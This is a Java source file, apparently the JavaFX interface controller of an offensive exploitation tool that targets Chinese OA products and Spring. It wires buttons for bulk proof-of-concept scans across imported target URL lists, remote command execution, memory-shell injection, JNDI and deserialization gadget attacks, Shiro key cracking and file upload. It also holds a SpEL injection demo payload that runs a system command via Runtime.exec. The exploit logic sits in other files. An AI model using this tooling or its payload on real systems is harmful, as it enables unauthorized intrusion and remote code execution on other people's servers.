package com.aurora.ui;

import com.aurora.Controllers.Console;
import com.aurora.SupportType.SupportVul;
import com.aurora.Utils.Cache;
import com.aurora.Utils.HttpRequest;
import com.aurora.Utils.Response;
import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.control.*;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.stage.FileChooser;
import javafx.stage.Window;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.*;
import java.util.*;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static com.aurora.Utils.ThreadPoolExecutorStu.ITDragonThreadPoolExecutor;

public class UIController {
    @FXML
    private ResourceBundle resources;
    @FXML
    private URL location;
    @FXML
    private MenuItem proxySetupBtn;
    @FXML
    private MenuItem ImportUrlsBtn;
    @FXML
    public ComboBox<String> SupportType;

    @FXML
    public ComboBox<String> SupportVul;
    @FXML
    private ComboBox<String> methodOpt;
    @FXML
    private TextField shiroKeyWord;
    @FXML
    public TextField targetAddress;

    @FXML
    public TextField DNSDomain;
    @FXML
    public TextField httpTimeout;
    @FXML
    public TextField SpelText;
    @FXML
    public TextField shiroKey;
    @FXML
    private CheckBox aesGcmOpt;
    @FXML
    private Button crackKeyBtn;
    @FXML
    private Button crackSpcKeyBtn;

    @FXML
    private Button GoPocBtn;

    @FXML
    private Button GoExpBtn;
    @FXML
    public ComboBox<String> gadgetOpt;
    @FXML
    public ComboBox<String> echoOpt;
    @FXML
    private Button crackGadgetBtn;
    @FXML
    private Button crackSpcGadgetBtn;
    @FXML
    public  TextArea logTextArea;
    @FXML
    public TextArea VulMd;
    @FXML
    private Label proxyStatusLabel;
    public static Map<String,Object> currentProxy = new HashMap();
    @FXML
    private TextField exCommandText;
    @FXML
    private TextField UploadFilePath;
    @FXML
    public TextArea execOutputArea;
    @FXML
    public TextArea SpelArea;
    @FXML
    private Button executeCmdBtn;
    @FXML
    public ComboBox<String> memShellOpt;
    @FXML
    private TextField shellPathText;
    @FXML
    private TextField shellPassText;

    @FXML
    private TextField JndiAddr;
    @FXML
    private TextField ExploitType;

    @FXML
    private TextField Gadget;

    @FXML
    private TextArea SerilArea;

    @FXML
    private Button injectShellBtn;
    @FXML
    public TextArea InjOutputArea;
    @FXML
    public TextArea JNDIMD;
    @FXML
    public TextArea uplaodFileMd;
    @FXML
    public static TextArea PublicArea;
    @FXML
    public TextArea keytxt;
    @FXML
    public ComboBox<String> SerilGadget;
    @FXML
    public Button keygen;

    public static List<String> Urls = new ArrayList<>();
    public static List<String> FilePath = new ArrayList<>();
    public static String LogDirPath = "";
    public UIController() {
    }

    @FXML
    void injectShellBtn(ActionEvent event) {

    }

    @FXML
    void executeCmdBtn(ActionEvent event) {
//
        String spelText = exCommandText.getText();
        this.GoExp(execOutputArea,spelText);
    }

    @FXML
    void crackSpcGadgetBtn(ActionEvent event) {

    }

    @FXML
    void crackGadgetBtn(ActionEvent event) {

    }


    /*
     * 开始跑POC ，只需要获取对应产品就可以。
     * */
    @FXML
    void GoPocFunc() throws InvocationTargetException, IllegalAccessException, MalformedURLException {
        try{


            if (this.targetAddress.getText().startsWith("file:\\\\")){
                ThreadPoolExecutor threadPoolExecutor = ITDragonThreadPoolExecutor();
                Cache.ThreadIdForLog = new HashMap<>();
                for (String url:Urls){

                    Console console = new Console();
                    console.setMethodName("GoPoc");
                    console.setProduct(this.SupportType.getValue());
                    console.setArgs(url);

                    // 执行8个任务，若超过MAXIMUM_POOL_SIZE则会报错 RejectedExecutionException
                    threadPoolExecutor.execute(console);
                    System.out.println("线程池中现在的线程数目是："+threadPoolExecutor.getPoolSize()+",  队列中正在等待执行的任务数量为："+
                            threadPoolExecutor.getQueue().size());
//                    try {
//                        // 阻塞等待30秒关掉线程池，返回true表示已经关闭。和shutdown不同，它可以接收外部任务，并且还阻塞。这里为了方便统计时间，所以选择阻塞等待关闭。
//                        threadPoolExecutor.awaitTermination(1, TimeUnit.SECONDS);
//                    } catch (InterruptedException e) {
//                        e.printStackTrace();
//                    }
                }
                // 关掉线程池 ，并不会立即停止(停止接收外部的submit任务，等待内部任务完成后才停止)，推荐使用。 与之对应的是shutdownNow，不推荐使用
                threadPoolExecutor.shutdown();
                return;
            }

            Console console = new Console();
            console.setMethodName("GoPoc");
            console.setProduct(this.SupportType.getValue());
            console.start();
        }catch (Exception e){
            System.out.println(e.getStackTrace());
        }


    }
    @FXML
    void GoSpel(ActionEvent event){

        String spelText = SpelText.getText();
        this.GoExp(SpelArea,spelText);
    }
    @FXML
    void initialize() throws Exception{
        this.initComBoBox();
        this.initToolbar();
        SpelArea.appendText("\n [*]demo: #{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"whoami\\\"}).getInputStream()))}");

    }

    public void initAttack() {


    }

    public void initContext() {

    }
    public void GoUpload(){
        String[] FilePathList = FilePath.toArray(new String[FilePath.size()]);
        this.GoExp(uplaodFileMd,FilePathList);
    }
    public void GoJndi(){
        String jndiStr = JndiAddr.getText();

        this.GoExp(JNDIMD,jndiStr);
    }
    public void GoSerialBtn(){
        String gadget = Gadget.getText();

        this.GoExp(SerilArea,gadget);
    }
    public void GoExp(TextArea logArea,Object... agrs){
        PublicArea = logArea;

        Console console = new Console();
        console.setMethodName("GoExp");
        console.setArgs(agrs);
        console.setProduct(this.SupportType.getValue());
        console.start();
    }
    public void SelectFile(){
        Alert win = new Alert(Alert.AlertType.NONE);
        File file = new FileChooser().showOpenDialog(win.getDialogPane().getScene().getWindow());
        try {
            if (file==null){
                this.uplaodFileMd.appendText("\n->>: 未选择文件");
                return;
            }
            String Filepath = file.getAbsolutePath();
            if (System.getProperties().getProperty("os.name").toLowerCase().contains("mac os")){

            }else {
                Filepath = Filepath.substring(1);
            }
            FilePath.add(Filepath);
            this.uplaodFileMd.appendText("\n->>: 已选择 文件 [*]:" + file.getAbsolutePath());
            this.uplaodFileMd.appendText("\n->>: 当前文件缓存数 [*]:" +FilePath.size());

        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
    public void DeleteFileList(){
        FilePath = new ArrayList<>();
        this.uplaodFileMd.appendText("\n->>: 已清空缓存 [*]:");
        this.uplaodFileMd.appendText("\n->>: 当前文件缓存数 [*]:" +FilePath.size());
    }
    public void initComBoBox() throws Exception {
        try {

            // new String[]{ "致远","泛微", "用友", "蓝凌", "通达", "万户", "Spring"};
            Cache.InitSupportType(this);
            ObservableList<String> SupportTypes = FXCollections.observableArrayList(Cache.SupprotType);
//        ObservableList<String> gadgets = FXCollections.observableArrayList(new String[]{ "CommonsBeanutils1" ,"CommonsBeanutils1_183" ,"CommonsCollections2", "CommonsCollections3", "CommonsCollectionsK1", "CommonsCollectionsK2", "CommonsBeanutilsString", "CommonsBeanutilsAttrCompare", "CommonsBeanutilsPropertySource", "CommonsBeanutilsObjectToStringComparator"});
//        ObservableList<String> gadgets = FXCollections.observableArrayList(new String[]{ "CommonsCollections2", "CommonsCollections3", "CommonsCollectionsK1", "CommonsCollectionsK2", "CommonsBeanutilsString", "CommonsBeanutilsAttrCompare", "CommonsBeanutilsPropertySource", "CommonsBeanutilsObjectToStringComparator"});
            this.SupportType.setPromptText("致远");
            this.SupportType.setValue("致远");
            this.SupportType.setItems(SupportTypes);

            //给SupportType 做监听，选择SupportType 时 改变 SupportVul
            this.SupportType.getSelectionModel().selectedIndexProperty().addListener(new ChangeListener<Number>() {
                @Override
                public void changed(ObservableValue<? extends Number> observable, Number oldValue, Number newValue) {
                    try {
                        String SelectType = SupportTypes.get((int)newValue);
                        List<Method> Methods = Cache.getVulRoutesValue(SelectType);
                        List<String> value= new ArrayList<String>();
                        for (Method method:Methods){
                            value.add(method.getName());
                        }
                        value.add("All");
                        String[] values = value.toArray(new String[value.size()]);
                        ObservableList<String> SupportVuls = FXCollections.observableArrayList(values);
                        SupportVul.setPromptText("All");
                        SupportVul.setValue("All");
                        SupportVul.setItems(SupportVuls);
                    }catch (Exception e){
                        System.out.println(e.getMessage());
                    }


                }
            });



            List<Method> Methods = Cache.getVulRoutesValue(this.SupportType.getValue());
            List<String> value= new ArrayList<>();
            for (Method method:Methods){
                value.add(method.getName());
            }
            value.add("All");
            String[] values = value.toArray(new String[value.size()]);

            ObservableList<String> SupportVuls = FXCollections.observableArrayList(values);
            SupportVul.setItems(SupportVuls);
            SupportVul.setPromptText("All");
            SupportVul.setValue("All");
            //给 SupportVul 做监听，选择SupportVul 时改变 ExploitType

            this.SupportVul.getSelectionModel().selectedIndexProperty().addListener(new ChangeListener<Number>() {
                @Override
                public void changed(ObservableValue<? extends Number> observable, Number oldValue, Number newValue) {
                    try {
                        if ((int)newValue<0){
                            return;
                        }
                        String SelectVul = SupportVul.getItems().get((int)newValue);
                        if (SelectVul.equals("All")){
                            return;
                        }
                        HashMap<String, com.aurora.SupportType.SupportVul> value = Cache.getVulDescriptions(SelectVul);// 这里获取 漏洞描述 和漏洞利用方式
                        String Description =null;
                        String ExploitType_ = null;
                        for (String key:value.keySet()){
                            Description =key;
                            ExploitType_ = value.get(Description).toString();
                        }
                        ExploitType.setText(ExploitType_);
                        VulMd.setText(Description);
                    }catch (Exception e){
                        System.out.println(e.getMessage());
                    }
                }
            });
        }catch (Exception e){
            System.out.println(e.getMessage());
        }


//        ObservableList<String> gadgets = FXCollections.observableArrayList(new String[]{ "CommonsBeanutils1" ,"CommonsBeanutils2" ,"CommonsCollectionsK1", "CommonsCollectionsK2", "Jdk7u21", "Jre8u20","C3P0"});
//        this.SerilGadget.setPromptText("CommonsBeanutils1");
//        this.SerilGadget.setValue("CommonsBeanutils1");
//        this.SerilGadget.setItems(gadgets);
    }
    public void ChangeSupportType(){

    }

    private void initToolbar() {
        this.proxySetupBtn.setOnAction((event) -> {
            Alert inputDialog = new Alert(Alert.AlertType.NONE);
            inputDialog.setResizable(true);
            Window window = inputDialog.getDialogPane().getScene().getWindow();
            window.setOnCloseRequest((e) -> {
                window.hide();
            });
            ToggleGroup statusGroup = new ToggleGroup();
            RadioButton enableRadio = new RadioButton("启用");
            RadioButton disableRadio = new RadioButton("禁用");
            enableRadio.setToggleGroup(statusGroup);
            disableRadio.setToggleGroup(statusGroup);
            HBox statusHbox = new HBox();
            statusHbox.setSpacing(10.0D);
            statusHbox.getChildren().add(enableRadio);
            statusHbox.getChildren().add(disableRadio);
            GridPane proxyGridPane = new GridPane();
            proxyGridPane.setVgap(15.0D);
            proxyGridPane.setPadding(new Insets(20.0D, 20.0D, 0.0D, 10.0D));
            Label typeLabel = new Label("类型：");
            ComboBox<String> typeCombo = new ComboBox();
            typeCombo.setItems(FXCollections.observableArrayList(new String[]{"HTTP", "SOCKS"}));
            typeCombo.getSelectionModel().select(0);
            Label IPLabel = new Label("IP地址：");
            TextField IPText = new TextField();
            Label PortLabel = new Label("端口：");
            TextField PortText = new TextField();
            Label userNameLabel = new Label("用户名：");
            TextField userNameText = new TextField();
            Label passwordLabel = new Label("密码：");
            TextField passwordText = new TextField();
            Button cancelBtn = new Button("取消");
            Button saveBtn = new Button("保存");
            saveBtn.setDefaultButton(true);
            IPText.setText("127.0.0.1");
            PortText.setText("8080");
            if (currentProxy.get("proxy") != null) {
                Proxy currProxy = (Proxy)currentProxy.get("proxy");
                String proxyInfo = currProxy.address().toString();
                String[] info = proxyInfo.split(":");
                String hisIpAddress = info[0].replace("/", "");
                String hisPort = info[1];
                IPText.setText(hisIpAddress);
                PortText.setText(hisPort);
                enableRadio.setSelected(true);
                System.out.println(proxyInfo);
            } else {
                enableRadio.setSelected(false);
            }

            saveBtn.setOnAction((e) -> {
                if (disableRadio.isSelected()) {
                    currentProxy.put("proxy", (Object)null);
                    this.proxyStatusLabel.setText("");
                    inputDialog.getDialogPane().getScene().getWindow().hide();
                } else {
                    String type;
                    String ipAddress;
                    if (!userNameText.getText().trim().equals("")) {
                        ipAddress = userNameText.getText().trim();
                        type = passwordText.getText();
                        String finalIpAddress = ipAddress;
                        String finalType = type;
                        Authenticator.setDefault(new Authenticator() {
                            @Override
                            public PasswordAuthentication getPasswordAuthentication() {
                                return new PasswordAuthentication(finalIpAddress, finalType.toCharArray());
                            }
                        });
                    } else {
                        Authenticator.setDefault((Authenticator)null);
                    }

                    currentProxy.put("username", userNameText.getText());
                    currentProxy.put("password", passwordText.getText());
                    ipAddress = IPText.getText();
                    String port = PortText.getText();
                    InetSocketAddress proxyAddr = new InetSocketAddress(ipAddress, Integer.parseInt(port));
                    type = ((String)typeCombo.getValue()).toString();
                    Proxy proxy;
                    if (type.equals("HTTP")) {
                        proxy = new Proxy(Proxy.Type.HTTP, proxyAddr);
                        currentProxy.put("proxy", proxy);
                    } else if (type.equals("SOCKS")) {
                        proxy = new Proxy(Proxy.Type.SOCKS, proxyAddr);
                        currentProxy.put("proxy", proxy);
                    }
                    try {
                        String url = "http://www.cip.cc/";
                        HttpRequest httpRequest = new HttpRequest(url);
                        Response result = httpRequest.Get("");
                        Pattern pattern1 = Pattern.compile("<pre>.*URL");
//                        Pattern pattern = Pattern.compile("^<pre>");
                        Matcher id1 = pattern1.matcher(result.responseBody);
                        String id2;
                        if (id1.find()){
                            id2 = id1.group(0);
                            this.proxyStatusLabel.setText("代理生效中: " + ipAddress + ":" + port+"  "+id2.replace("<pre>","").replace("URL",""));
                        }
                    } catch (MalformedURLException ex) {
                        ex.printStackTrace();
                    }

                    inputDialog.getDialogPane().getScene().getWindow().hide();
                }

            });
            cancelBtn.setOnAction((e) -> {
                inputDialog.getDialogPane().getScene().getWindow().hide();
            });
            proxyGridPane.add(statusHbox, 1, 0);
            proxyGridPane.add(typeLabel, 0, 1);
            proxyGridPane.add(typeCombo, 1, 1);
            proxyGridPane.add(IPLabel, 0, 2);
            proxyGridPane.add(IPText, 1, 2);
            proxyGridPane.add(PortLabel, 0, 3);
            proxyGridPane.add(PortText, 1, 3);
            proxyGridPane.add(userNameLabel, 0, 4);
            proxyGridPane.add(userNameText, 1, 4);
            proxyGridPane.add(passwordLabel, 0, 5);
            proxyGridPane.add(passwordText, 1, 5);
            HBox buttonBox = new HBox();
            buttonBox.setSpacing(20.0D);
            buttonBox.setAlignment(Pos.CENTER);
            buttonBox.getChildren().add(cancelBtn);
            buttonBox.getChildren().add(saveBtn);
            GridPane.setColumnSpan(buttonBox, 2);
            proxyGridPane.add(buttonBox, 0, 6);
            inputDialog.getDialogPane().setContent(proxyGridPane);
            inputDialog.showAndWait();
        });

        this.ImportUrlsBtn.setOnAction((event ->{
            Alert win = new Alert(Alert.AlertType.NONE);
            File file = new FileChooser().showOpenDialog(win.getDialogPane().getScene().getWindow());
            try {
                if (file==null){
                    this.logTextArea.appendText("->>: 未选择文件");
                    return;
                }
                if (!file.getPath().endsWith(".txt")){
                    this.logTextArea.setText("");
                    this.logTextArea.appendText("请选择txt 文件. 每个地址以换行分割");
                    return;
                }
                FileInputStream fileInputStream = new FileInputStream(file);
                try {
                    byte[] bytes = new byte[fileInputStream.available()];
                    fileInputStream.read(bytes);
                    String urlsStr = new String(bytes);
                    String[] list =  urlsStr.split("\n");
                    String LogPath = "";
                    for (String one : list){
                        Urls.add(one.trim());
                        LogPath = this.getClass().getProtectionDomain().getCodeSource().getLocation().getPath();
                        LogPath = LogPath.substring(1);
                        // String localname =LogPath.substring(LogPath.lastIndexOf("/")+1);
                        LogPath = LogPath.substring(0,LogPath.lastIndexOf("/"));
                    }
                    String DirName = file.getName().substring(0,file.getName().lastIndexOf("."));
                    String filePath = LogPath+"\\"+DirName+"_Log";
                    filePath = URLDecoder.decode(filePath,"UTF-8");

                    if (System.getProperties().getProperty("os.name").toLowerCase().contains("mac os")){
                        filePath = "/" + filePath.replace("\\","/");
                    }
                    File DirPath = new File(filePath) ;
                    if (!DirPath.isDirectory()){
                        DirPath.mkdir();
                    }
                    LogDirPath = DirPath.getPath();
                    this.logTextArea.setText("");
                    this.logTextArea.appendText("\n[*]日志路径:"+DirPath);
                    this.targetAddress.setText("file:\\\\"+file.getAbsolutePath());

                } catch (IOException ex) {
                    ex.printStackTrace();
                }
            } catch (FileNotFoundException ex) {
                ex.printStackTrace();
            }
        } ));
    }

    @FXML
    void Keytxt(ActionEvent actionEvent) {

    }
}
